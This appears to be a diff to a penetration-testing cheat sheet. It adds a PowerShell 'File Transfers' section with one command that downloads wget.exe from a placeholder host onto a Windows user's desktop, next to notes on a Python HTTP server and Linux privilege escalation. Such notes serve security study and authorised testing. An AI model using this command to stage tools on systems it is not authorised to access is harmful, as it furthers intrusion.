@@ -29,6 +29,12 @@
     python -m SimpleHTTPServer [PORT] 
   ```
   
+## PowerShell
+
+### File Transfers
+  ```powershell
+  powershell -c "(new-object System.net.WebCLient).DownloadFile('http://X.X.X.X/wget.exe','C:\Users\xonork\Desktop\wget.exe')"
+  ```
   
 ## **Linux Privilege Escalation**
 
